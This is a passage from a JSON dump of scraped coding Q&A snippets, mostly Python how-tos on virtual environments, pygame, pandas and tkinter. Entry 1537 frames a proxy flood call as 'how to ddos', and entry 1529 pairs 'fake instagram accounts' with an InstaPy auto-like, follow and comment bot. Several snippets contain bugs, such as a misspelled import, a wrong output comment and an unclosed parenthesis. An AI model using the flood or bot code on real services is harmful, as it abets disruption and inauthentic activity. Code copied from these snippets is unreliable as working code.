    "description": "$ pip install virtualenv $ pip install virtualenvwrapper  // Append ~/.bashrc export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3 export WORKON_HOME=$HOME/.virtualenvs export VIRTUALENVWRAPPER_VIRTUALENV=/$HOME/.local/bin/virtualenv source ~/.local/bin/virtualenvwrapper.sh\npython3 -m venv name_environment #this creates the virtual environment  source name_environment/bin/activate #this activates the virtual environment  #to install packages first activate the environment then do pip install ...\nsudo apt-get install python3-pip virtualenv djangoProject virtualenv -p /usr/bin/python3.6 djangoProject source djangoProject/bin/activate\nsource venv/bin/activate\n",
    "reg_date": "2021-10-12T11:30:11.000Z"
  },
  {
    "id": 1523,
    "keyword": null,
    "link": null,
    "title": " how to create a window in pygame",
    "description": "import pygame pygame.init() back = (192,192,192) gameDisplay = pygame.display.set_mode((800,600)) pygame.display.set_caption('A bit Racey') gameDisplay.fill(back) clock = pygame.time.Clock() running = True while running:     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False     pygame.display.update()     clock.tick(60)    pygame.quit() quit()              \nimport pygame pygame.init() #initialize pygame SCREEN_WIDTH = 600 # width (in px) SCREEN_HEIGHT = 800 # height (in px)  WIN = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT)) # creates a screen of 600px X 800px  while True: \tpygame.display.update() # updates the screen\nimport pygame pygame.init() screen = pygame.display.set_mode((800,600)) pygame.display.set_caption('A bit Racey') clock = pygame.time.Clock() running = True while running:     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False     pygame.display.update()     clock.tick(80)    pygame.quit() quit()\n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1524,
    "keyword": null,
    "link": null,
    "title": " how to create chess board numpy",
    "description": "import numpy as np  a=np.array(([1,0]*4+[0,1]*4)*4).reshape((8,8)) print(a)  # [[1 0 1 0 1 0 1 0]  [0 1 0 1 0 1 0 1]  [1 0 1 0 1 0 1 0]  [0 1 0 1 0 1 0 1]  [1 0 1 0 1 0 1 0]  [0 1 0 1 0 1 0 1]  [1 0 1 0 1 0 1 0]  [0 1 0 1 0 1 0 1]] \n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1525,
    "keyword": null,
    "link": null,
    "title": " how to create clock in python",
    "description": "import sys from  tkinter import * import time   def times():     current_time=time.strftime(\"%H:%M:%S\")      clock.config(text=current_time)     clock.after(200,times)   root=Tk() root.geometry(\"500x250\") clock=Label(root,font=(\"times\",50,\"bold\"),bg=\"black\",fg='blue') clock.grid(row=2,column=2,pady=25,padx=100) times()  digi=Label(root,text=\"Digital clock\",font=\"times 24 bold\",fg=\"violet\") digi.grid(row=0,column=2)  nota=Label(root,text=\"hours   minutes   seconds   \",font=\"times 15 bold\") nota.grid(row=3,column=2)  root.mainloop() \nplease subscribe my channel - https://bit.ly/2Me2CfB  from tkinter import * import time import playsound  root = Tk() root.geometry('600x175') root.title(\"Clock\") root.config(background='black')  def clock():     main_time = time.strftime(\"%H:%M:%S:%p\")     lbl.config(text=main_time)     lbl.after(1000, clock)  lbl = Label(root, text=\"\", font=('Digital Display Regular', 90), bg=\"black\", fg=\"cyan\") lbl.pack(anchor=CENTER)  clock() root.mainloop()\n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1526,
    "keyword": null,
    "link": null,
    "title": " how to create custom scoring function for randomizedsearchcv",
    "description": "# create custom loss function from sklearn.metrics import make_scorer  # custom loss function def rmse_loss(y_true, y_pred):     return np.sqrt(np.mean(np.square(y_pred - y_true)))     rmse = make_scorer(rmse_loss, greater_is_better=False)  # training randomized search cv model_rndm = RandomizedSearchCV(RandomForestRegressor(),                                  param_distributions=random_grid,                                 n_iter=200, scoring=rmse, cv=3, n_jobs=-1)                                                  &uarr; #                                      our custom loss function\n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1527,
    "keyword": null,
    "link": null,
    "title": " how to create dataframe in python",
    "description": "In [4]: import pandas as pd In [5]: df = pd.DataFrame(columns=['A','B','C','D','E','F','G']) In [6]: df Out[6]: Empty DataFrame Columns: [A, B, C, D, E, F, G] Index: []\n>>> df2 = pd.DataFrame(np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]), ...                    columns=['a', 'b', 'c']) >>> df2    a  b  c 0  1  2  3 1  4  5  6 2  7  8  9 \nimport pandas as pd    # intialise data of lists. data = {'Name':['Tom', 'nick', 'krish', 'jack'],         'Age':[20, 21, 19, 18]}    # Create DataFrame df = pd.DataFrame(data)    # Print the output. df\nimport pandas as pd  data = {'First Column Name':  ['First value', 'Second value',...],         'Second Column Name': ['First value', 'Second value',...],          ....         }  df = pd.DataFrame (data, columns = ['First Column Name','Second Column Name',...]) print (df)\n# Import pandas library  import pandas as pd     # initialize list of lists  data = [['Group A', 85], ['Group B', 92], ['Group C', 88]]     # Create the pandas DataFrame  df = pd.DataFrame(data, columns = ['Name', 'Score'])     # print dataframe.  df \nimport numpy as np import pandas as pd vect1=np.zeros(10) vect2=np.ones(10) df=pd.DataFrame({'col1':vect1,'col2':vect2})\n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1528,
    "keyword": null,
    "link": null,
    "title": " how to create dynamic variable names in python",
    "description": "for x in range(0, 9):     globals()['string%s' % x] = 'Hello' # string0 = 'Hello', string1 = 'Hello' ... string8 = 'Hello'\nfor i in range(0, 9):     globals()[f\"my_variable{i}\"] = f\"Hello from variable number {i}!\"   print(my_variable3) # Hello from variable number 3!\n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1529,
    "keyword": null,
    "link": null,
    "title": " how to create fake instagram accounts with python",
    "description": "from instapy import InstaPy  session = InstaPy(username=\"<your_username>\", password=\"<your_password>\") session.login() session.like_by_tags([\"bmw\", \"mercedes\"], amount=5) session.set_dont_like([\"naked\", \"nsfw\"]) session.set_do_follow(True, percentage=50) session.set_do_comment(True, percentage=50) session.set_comments([\"Nice!\", \"Sweet!\", \"Beautiful :heart_eyes:\"]) session.end() \n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1530,
    "keyword": null,
    "link": null,
    "title": " how to create fibonacci sequence in python",
    "description": "#Python program to generate Fibonacci series until 'n' value n = int(input(\"Enter the value of 'n': \")) a = 0 b = 1 sum = 0 count = 1 print(\"Fibonacci Series: \", end = \" \") while(count <= n):   print(sum, end = \" \")   count += 1   a = b   b = sum   sum = a + b \n#Learnprogramo Number = int(input(\"How many terms? \")) # first two terms First_Value, Second_Value = 0, 1 i = 0 if Number <= 0: print(\"Please enter a positive integer\") elif Number == 1: print(\"Fibonacci sequence upto\",Number,\":\") print(First_Value) else: print(\"Fibonacci sequence:\") while i < Number: print(First_Value) Next = First_Value + Second_Value # update values First_Value = Second_Value Second_Value = Next i += 1\n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1531,
    "keyword": null,
    "link": null,
    "title": " how to create file using python cat command",
    "description": "import os os.system(\"cat > brightness_control_in_python.py\") #if this error comes no worries your file is already created 'cat' is not recognized as an internal or external command, operable program or batch file. #take a look in your folder where you make python files you will find your file #created there\n",
    "reg_date": "2021-10-12T11:30:12.000Z"
  },
  {
    "id": 1532,
    "keyword": null,
    "link": null,
    "title": " how to create json file in python",
    "description": "#import the json module import json   #create a dictionary which we can add to a json file dictionary ={      \"name\" : \"sathiyajith\",      \"rollno\" : 56,      \"cgpa\" : 8.6,      \"phonenumber\" : \"9976770500\" }   #open an object with following inputs: 'name_of_file.json', 'w' #dump the content fromt he dictionary into the outfile with open(\"sample.json\", \"w\") as outfile:      json.dump(dictionary, outfile) \n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1533,
    "keyword": null,
    "link": null,
    "title": " how to create migrations in django",
    "description": "$ python3 manage.py makemigrations $ python3 manage.py migrate\n//to create migration files python manage.py makemigrations  //to migrate migration files python manage.py migrate \n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1534,
    "keyword": null,
    "link": null,
    "title": " how to create progress bar python",
    "description": "from tqdm import tdqm  LENGTH = 10 # Number of iterations required to fill pbar  pbar = tqdm(total=LENGTH) # Init pbar for i in range(LENGTH):   pbar.update(n=1) # Increments counter\nfrom tqdm import tqdm for i in tqdm(range(0,int(10E6))):   continue\n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1535,
    "keyword": null,
    "link": null,
    "title": " how to create text file with python and store a dictionary",
    "description": "import json  Dict = {'Dict': Dict}  with open('file.txt', 'w') as file:      file.write(json.dumps(Dict))\n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1536,
    "keyword": null,
    "link": null,
    "title": " how to create virtual environment",
    "description": "#------FOR LINUX/MAC---------# #installing venv  sudo apt-get install python3.6-venv #creating virtual env python3 -m venv env #activating virtual env source env/bin/activate   #-------FOR WINDOWS----------# #installing venv py -m pip install --user virtualenv #creating virtual env py -m venv env #activating virtual env .\\env\\Scripts\\activate \npython3 -m venv env python -m virtualenv env #py2  source env/bin/activate  #all this is on same directory \n# for windows 10  py -m venv myvirtualenv myvirtualenv\\Scripts\\activate #!!!! use \"\\\" not \"/\" !!!!!\npip install virtualenv cd projectfolder #go to project folder virtualenv projectname #create the folder projectname  source projectname/bin/activate\npython3 -m venv tutorial-env #name : tutorial-env tutorial-env\\Scripts\\activate \t#activate env deactivate #deactivate env\n# install the package virtualenv pip install virtualenv  # setup envioronment for Data engineering pipeline virtualenv dataengineer_pipeline  # if using python >= 3.3 python -m venv dataengineer_pipeline  # start the environment in linux using  dataengineer_pipeline/bin/activate  # or in windows dataengineer_pipeline\\Scripts\\activate.bat  # when you are done using the environment, type in the command below deactivate\n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1537,
    "keyword": null,
    "link": null,
    "title": " how to ddos",
    "description": "pip install DDOS ip = '127.0.0.1:5000/' PROXIES = { \t\"username:password@proxy1:6000/\", } DDOS.attack(ip, proxies=PROXIES)   print(\"DDOS HAS BEEN SUCCESSFUL!\")        # p.s. WTF MATE DONT DDOS PEOPLE\n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1538,
    "keyword": null,
    "link": null,
    "title": " how to define a new error in python",
    "description": "# https://www.programiz.com/python-programming/user-defined-exception  class SimpleCustomError(Exception): # it is a simple example.   pass  class CustomError(Exception):      # We can override the constructor of Exception class to accomplish our own __init__.     def __init__(self,number, customMessage:str = 'The number should not be more than 1 and less than -1.'):         self.number = number         self.msg = customMessage         super(CustomError, self).__init__(self.msg)      # We can implement our custom __str__ dunder method.     def __str__(self):         return '%s is out of range. %s' % (self.number, self.msg)  def run(num):     if num > 1 or num < -1:         raise CustomError(num)   try:     run(2) except CustomError as err:     print(err.msg)     print(err)     print(str(err)) else:     print('No Error occurred.') finally:     print('End of run.') \n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1539,
    "keyword": null,
    "link": null,
    "title": " how to define main in python",
    "description": "def main():     print(\"Hello World!\")  if __name__ == \"__main__\":     main()\n# Defining main function  def main():      print(\"hello World\")        # Using the special variable   # __name__  if __name__==\"__main__\":      main() \n print(\"Hello\")  print(\"__name__ value: \", __name__)   def main():     print(\"python main function\")   if __name__ == '__main__':     main() \n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1540,
    "keyword": null,
    "link": null,
    "title": " how to delete every row in excel using openpyxl",
    "description": "import openpyxl as xl wb = xl.load_workbook() ws = wb.active ws.delete_rows(firstrow, numberofrows) #for multiple row deletion ws.delete_rows(1, ws.max_row+1) # for entire sheet ws.delete_rows(rownum) #for single row\n",
    "reg_date": "2021-10-12T11:30:13.000Z"
  },
  {
    "id": 1541,
    "keyword": null,
    "link": null,
    "title": " how to delete everything on a file python",
    "description": "f = open('file.txt', 'r+') f.truncate(0) # need '0' when using r+\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1542,
    "keyword": null,
    "link": null,
    "title": " how to delete in python",
    "description": "#x will be deleted print(\"x\\b\")\nmyList.remove(item) # Removes first instance of \"item\" from myList myList.pop(i) # Removes and returns item at myList[i]\n>>> a = ['a', 'b', 'c', 'd'] >>> a.remove('b') >>> print a ['a', 'c', 'd']\n# the list.remove(object) method takes one argument  # the object or element value you want to remove from the list # it removes the first coccurence from the list  generic_list = [1, 2, 2, 2, 3, 3, 4, 5, 5, 5, 6, 8, 8, 8]  generic_list.remove(1)  # The Generic list will now be: # [2, 2, 2, 3, 3, 4, 5, 5, 5, 6, 8, 8, 8]  \nl = [1,2,3,4] l.clear()\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1543,
    "keyword": null,
    "link": null,
    "title": " how to delete na values in a dataframe",
    "description": "# if you want to delete rows containing NA values df.dropna(inplace=True)\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1544,
    "keyword": null,
    "link": null,
    "title": " how to delete nan values in python",
    "description": "cleanedList = [x for x in countries if str(x) != 'nan'] \nx = x[~numpy.isnan(x)]\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1545,
    "keyword": null,
    "link": null,
    "title": " how to delete the last item in a list python",
    "description": "# The pop function, without an input, defaults to removing  # and returning the last item in a list. myList = [1, 2, 3, 4, 5] myList.pop() print(myList)  # You can also do this without returning the last item, but it is # much more complicated. myList = [1, 2, 3, 4, 5] myList.remove(myList[len(myList)-1]) print(myList)\n#pop removes the last element li=[1,2,3,4,5] li.pop() #>>>[1, 2, 3, 4] \n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1546,
    "keyword": null,
    "link": null,
    "title": " how to detect a keypress tkinter",
    "description": "window.bind(\"<Key>\", exampleFunction)\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1547,
    "keyword": null,
    "link": null,
    "title": " how to detect color collision in pygame",
    "description": "WITHOUT ALPHA VALUE  color = (0,0,0) while True:     color = pygame.Surface.get_at((x,y))[:3]     if color = (#certain value)         #do something          WITH ALPHA VALUE color = (0,0,0,0) while True:     color = pygame.surface.get_at((x,y))     if color = (#certain value)         #do somthing\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1548,
    "keyword": null,
    "link": null,
    "title": " how to detect keypress in python",
    "description": "# in command prompt, type \"pip install pynput\" to install pynput. from pynput.keyboard import Key, Controller  keyboard = Controller() key = \"a\"  keyboard.press(key) keyboard.release(key)\nimport keyboard # if key 'a' is pressed  if keyboard.is_pressed('a'): \tprint('a key has ben pressed')\n# in console: pip install keyboard import time import keyboard as kb  key = \"a\"  while (True): \tif (kb.is_pressed(key)): \t\tprint(\"a pressed\") \t     time.sleep(0.001) # decreases CPU usage\nimport keyboard  # using module keyboard while True:  # making a loop     try:  # used try so that if user pressed other than the given key error will not be shown         if keyboard.is_pressed('q'):  # if key 'q' is pressed              print('You Pressed A Key!')             break  # finishing the loop     except:         break  # if user pressed a key other than the given key the loop will break\n# pip3 install pynput  from pynput.keyboard import Key, Listener   def show(key):      pressed_key = str(key).replace(\"'\", \"\")     print(\" key: \", pressed_key)      if key == Key.esc:         # Stop listener         return False   # Listener with Listener(on_press=show) as listener:     listener.join() \nvar input = document.getElementById('myInput'); input.onkeydown = function() {     var key = event.keyCode || event.charCode;     if( key == 8 ){     \t//backspace pressed     } };\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1549,
    "keyword": null,
    "link": null,
    "title": " how to detect mouse click in pygame",
    "description": "while ... # your main loop   # get all events   ev = pygame.event.get()    # proceed events   for event in ev:      # handle MOUSEBUTTONUP     if event.type == pygame.MOUSEBUTTONUP:       pos = pygame.mouse.get_pos()        # get a list of all sprites that are under the mouse cursor       clicked_sprites = [s for s in sprites if s.rect.collidepoint(pos)]       # do something with the clicked sprites...\nwhile running: # Gameloop   for event in pygame.event.get(): # Checks all events     if event.type == pygame.MOUSEBUTTONDOWN: # If the current event is the mouse button down event       pos = pygame.mouse.get_pos() # Stores the mouse position\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1550,
    "keyword": null,
    "link": null,
    "title": " how to develop model of ann in ML",
    "description": "# Initializing the ANN ann = tf.keras.models.Sequential()  # Adding the input layer and the first hidden layer ann.add(tf.keras.layers.Dense(units=6, activation='relu')) # units = 6 -- has highest accuracy  # Adding the second hidden layer ann.add(tf.keras.layers.Dense(units=6, activation='relu'))  # Adding the output layer ann.add(tf.keras.layers.Dense(units=1, activation='sigmoid')) # units = 1 -- for binary values  # Part 3 - Training the ANN  # Compiling the ANN ann.compile(optimizer = 'adam', loss = 'binary_crossentropy', metrics = ['accuracy'])  # Training the ANN on the Training set ann.fit(X_train, y_train, batch_size = 32, epochs = 100)\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1551,
    "keyword": null,
    "link": null,
    "title": " how to disable help command discord.py",
    "description": "bot.remove_command('help')\n",
    "reg_date": "2021-10-12T11:30:14.000Z"
  },
  {
    "id": 1552,
    "keyword": null,
    "link": null,
    "title": " how to display speechmarks in python string",
    "description": "print(\"\\\"A word that needs quotation marks\\\"\")\n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1553,
    "keyword": null,
    "link": null,
    "title": " how to do collision detection in pygame",
    "description": "#making stuff to collide player=pygame.Rect(whatever you want) villian=pygame.Rect(whatever you want)  #making the detection if villian.colliderect(player): \tprint (\"villian got you oh no!\")#this can be something different     \n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1554,
    "keyword": null,
    "link": null,
    "title": " how to do key sensing in python",
    "description": "import keyboard # if key 'a' is pressed  if keyboard.is_pressed('a'): \tprint('a key has ben pressed')\nimport keyboard, time  # Continuously check if 'c' key is pressed  while True:   if keyboard.is_pressed('c'):     print('The c key was pressed')\n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1555,
    "keyword": null,
    "link": null,
    "title": " how to do pandas profiling",
    "description": "//get the latest version of pandas_profiling import numpy as np import pandas as pd import pandas_profiling  df1=pd.read_csv(<File path>)  profile = df1.profile_report(title=\"<give any name you want>\") profile.to_file(output_file=\"<givefilename>.html\")\n!pip install https://github.com/pandas-profiling/pandas-profiling/archive/master.zip    from pandas_profiling import ProfileReport  profile = ProfileReport(df, title='Pandas Profiling Report', explorative=True) profile.to_widgets()\n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1556,
    "keyword": null,
    "link": null,
    "title": " how to downgrade a package python",
    "description": "pip install --upgrade [package]==[version]\n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1557,
    "keyword": null,
    "link": null,
    "title": " how to downgrade python to 3.7 4 anaconda",
    "description": " conda install python=3.5.0   # or maybe    conda install python=2.7.8   # or whatever you want.... \n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1558,
    "keyword": null,
    "link": null,
    "title": " how to download a page in python",
    "description": "import urllib.request, urllib.error, urllib.parse url = \"The url of the page you want to download\" response = urllib.request.urlopen(url)\n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1559,
    "keyword": null,
    "link": null,
    "title": " how to download file from python",
    "description": "import wget  url = \"https://www.python.org/static/img/python-logo@2x.png\"  wget.download(url, 'c:/users/LikeGeeks/downloads/pythonLogo.png')\n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1560,
    "keyword": null,
    "link": null,
    "title": " how to download the captions of a youtube video",
    "description": "# pip install youtube_transcript_api  from youtube_transcript_api import YouTubeTranscriptApi  video_link = 'https://www.youtube.com/watch?v=Vdj1TNWJAZ4&t=8s'  video_id = video_link.split('watch?v=')[1]  subtitle = YouTubeTranscriptApi.get_transcript(video_id=video_id, languages=['en'])  # you can do anything with downloaded caption. # for example: print(subtitle)\n",
    "reg_date": "2021-10-12T11:30:15.000Z"
  },
  {
    "id": 1561,
    "keyword": null,
    "link": null,
    "title": " how to draw image in tkinter",
    "description": "from tkinter import * from PIL import ImageTk, Image  root = Tk()  c = Canvas(root, width=500, height=500) c.pack()  img = ImageTk.PhotoImage(Image.open(r\"imagepath\\imagename.extension\")) c.create_image(x, y, image=img, anchor=NW)\nfrom tkinter import * root = Tk() myCanvas = Canvas(root) myCanvas.pack()  def create_circle(x, y, r, canvasName): #center coordinates, radius     x0 = x - r     y0 = y - r     x1 = x + r     y1 = y + r     return canvasName.create_oval(x0, y0, x1, y1)  create_circle(100, 100, 20, myCanvas) create_circle(50, 25, 10, myCanvas) root.mainloop()\n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1562,
    "keyword": null,
    "link": null,
    "title": " how to drop the index column in pandas",
    "description": "df.reset_index(drop=True)\ncols = [1,2,4,5,12] df.drop(df.columns[cols],axis=1,inplace=True) \n>>> df.reset_index(drop=True)     class  max_speed 0    bird      389.0 1    bird       24.0 2  mammal       80.5 3  mammal        NaN \ndf.reset_index(drop=True, inplace=True)\n df.to_csv(filename, index=False) \n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1563,
    "keyword": null,
    "link": null,
    "title": " how to edit a specific line in text file in python",
    "description": "# with is like your try .. finally block in this case with open('stats.txt', 'r') as file:     # read a list of lines into data     data = file.readlines()  print data print \"Your name: \" + data[0]  # now change the 2nd line, note that you have to add a newline data[1] = 'Mage\\n'  # and write everything back with open('stats.txt', 'w') as file:     file.writelines( data )\n# with is like your try .. finally block in this case with open('stats.txt', 'r') as file:     # read a list of lines into data     data = file.readlines()  print data print \"Your name: \" + data[0]  # now change the 2nd line, note that you have to add a newline data[1] = 'Mage\\n'  # and write everything back with open('stats.txt', 'w') as file:     file.writelines( data ) \n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1564,
    "keyword": null,
    "link": null,
    "title": " how to enable matplotlib in notebook",
    "description": "%matplotlib inline\n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1565,
    "keyword": null,
    "link": null,
    "title": " how to encrypt a pdf file in python",
    "description": "import PyPDF2 import os import argparse     def set_password(input_file, user_pass, owner_pass):     \"\"\"     Function creates new temporary pdf file with same content,     assigns given password to pdf and rename it with original file.     \"\"\"     # temporary output file with name same as input file but prepended     # by \"temp_\", inside same direcory as input file.     path, filename = os.path.split(input_file)     output_file = os.path.join(path, \"temp_\" + filename)       output = PyPDF2.PdfFileWriter()       input_stream = PyPDF2.PdfFileReader(open(input_file, \"rb\"))       for i in range(0, input_stream.getNumPages()):         output.addPage(input_stream.getPage(i))       outputStream = open(output_file, \"wb\")       # Set user and owner password to pdf file     output.encrypt(user_pass, owner_pass, use_128bit=True)     output.write(outputStream)     outputStream.close()       # Rename temporary output file with original filename, this     # will automatically delete temporary file     os.rename(output_file, input_file)     def main():     parser = argparse.ArgumentParser()     parser.add_argument('-i', '--input_pdf', required=True,                         help='Input pdf file')     parser.add_argument('-p', '--user_password', required=True,                         help='output CSV file')     parser.add_argument('-o', '--owner_password', default=None,                         help='Owner Password')     args = parser.parse_args()     set_password(args.input_pdf, args.user_password, args.owner_password)   if __name__ == \"__main__\":     main() \n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1566,
    "keyword": null,
    "link": null,
    "title": " how to encrypt a string python",
    "description": "from cryptography.fernet import Fernet message = \"my deep dark secret\".encode()  f = Fernet(key) encrypted = f.encrypt(message) \ndef load_key():     \"\"\"     Loads the key named `secret.key` from the current directory.     \"\"\"     return open(\"secret.key\", \"rb\").read() \n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1567,
    "keyword": null,
    "link": null,
    "title": " how to equal two arrays in python with out linking them",
    "description": "array2 = array1[:] #for array of arrays,each cell individually\n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1568,
    "keyword": null,
    "link": null,
    "title": " how to execute python program in ubuntu",
    "description": "#to exicute a python file in Ubuntu follow the steps given below sudo apt install python3 #run this command in your terminal  #if python3 is already in your pc leave this command #in the same terminal locate your file by using cd and run this command python3 <The_python_file_name.py>\npython <filename.py> \n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1569,
    "keyword": null,
    "link": null,
    "title": " how to execute python script in another script",
    "description": "import subprocess subprocess.call(\" python script2.py 1\", shell=True) \nimport fileB fileB.my_func()\n",
    "reg_date": "2021-10-12T11:30:16.000Z"
  },
  {
    "id": 1570,
    "keyword": null,
    "link": null,
    "title": " how to export a string as txt file in python",
    "description": "text_file = open(\"sample.txt\", \"w\") n = text_file.write('Welcome to pythonexamples.org') text_file.close()\n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1571,
    "keyword": null,
    "link": null,
    "title": " how to extract month from date in python",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1572,
    "keyword": null,
    "link": null,
    "title": " how to fill missing values dataframe with mean",
    "description": "sub2['income'].fillna((sub2['income'].mean()), inplace=True)\n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1573,
    "keyword": null,
    "link": null,
    "title": " how to fill na python",
    "description": " df['DataFrame Column'] = df['DataFrame Column'].fillna(0)\n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1574,
    "keyword": null,
    "link": null,
    "title": " how to fill nas on a dataframe with median",
    "description": "df.fillna(df.mean(), inplace=True)\n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1575,
    "keyword": null,
    "link": null,
    "title": " how to filter out all NaN values in pandas df",
    "description": "df = df[df['EPS'].notna()]\n#return a subset of the dataframe where the column name value != NaN  df.loc[df['column name'].isnull() == False] \ndf = df[df['my_var'].notna()]\nIn [30]: df.dropna(subset=[1])   #Drop only if NaN in specific column (as asked in the question) Out[30]:           0         1         2 1  2.677677 -1.466923 -0.750366 2       NaN  0.798002 -0.906038 3  0.672201  0.964789       NaN 5 -1.250970  0.030561 -2.678622 6       NaN  1.036043       NaN 7  0.049896 -0.308003  0.823295 9 -0.310130  0.078891       NaN \na = [[y for y in x if pd.notna(y)] for x in df.values.tolist()] print (a) [['str', 'aad', 'asd'], ['ddd'], ['xyz', 'abc'], ['btc', 'trz', 'abd']] \n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1576,
    "keyword": null,
    "link": null,
    "title": " how to filter pandas dataframe column with multiple values",
    "description": "# Multiple Criteria dataframe filtering movies[movies.duration >= 200] # when you wrap conditions in parantheses, you give order # you do those in brackets first before 'and' # AND movies[(movies.duration >= 200) & (movies.genre == 'Drama')]  # OR  movies[(movies.duration >= 200) | (movies.genre == 'Drama')]  (movies.duration >= 200) | (movies.genre == 'Drama')  (movies.duration >= 200) & (movies.genre == 'Drama')  # slow method movies[(movies.genre == 'Crime') | (movies.genre == 'Drama') | (movies.genre == 'Action')]  # fast method filter_list = ['Crime', 'Drama', 'Action'] movies[movies.genre.isin(filter_list)] \n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1577,
    "keyword": null,
    "link": null,
    "title": " how to find an item in an array in python",
    "description": "array = ['hello','people','i','want','icecream'] print(x.index('people')) -> 1\n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1578,
    "keyword": null,
    "link": null,
    "title": " how to find and replace all the punctuation in python strings",
    "description": "#import the regex library (pip install it with -> \"pip install regex\" import re  test_phrase = 'This is a string! Bust it has punctuation. How can we remove it?'  #We're going to replace the punctution with a whitespace clean = ' '.join(re.findall('[^!.?]+', test_phrase)) #         \t\t\t\t\t\t^ Place the punctuation that you want #\t\t\t\t\t\t\t\t  to remove in the square brackets. print(clean) > 'This is a string But it has punctuation How can we remove it'\n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1579,
    "keyword": null,
    "link": null,
    "title": " how to find current age from date of birth in python",
    "description": "from datetime import date  def calculate_age(born):     today = date.today()     return today.year - born.year - ((today.month, today.day) < (born.month, born.day))\ntoday_date = datetime.datetime.now() dob = datetime.datetime(1982, 5, 20) print(today_date - dob)\n#Python Calculate Age from date of birth:  from datetime import date  def calculate_age(born):     today = date.today()     return today.year - born.year - ((today.month, today.day) < (born.month, born.day))\n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1580,
    "keyword": null,
    "link": null,
    "title": " how to find geometric mean in python",
    "description": ">>> from scipy.stats.mstats import gmean >>> gmean([1.0, 0.00001, 10000000000.]) 46.415888336127786 \n",
    "reg_date": "2021-10-12T11:30:17.000Z"
  },
  {
    "id": 1581,
    "keyword": null,
    "link": null,
    "title": " how to find if user input is lower case or upper case in python",
    "description": "lower_case_items = \"abcdefghijklmnopqrstuvwxyz\" char = \"B\" if char in lower_case_items:     print(\"This item is lower case\") else:     print(\"This item is Upper case item\")\nlower_case_items = \"abcdefghijklmnopqrstuvwxyz\" char = str(input(\"Any letter:- \") if char in lower_case_items:     print(\"This item is lower case\") else:     print(\"This item is Upper case item\")            \n",
    "reg_date": "2021-10-12T11:30:18.000Z"
  },
  {
    "id": 1582,
    "keyword": null,
    "link": null,
    "title": " how to find ip address of website using python",
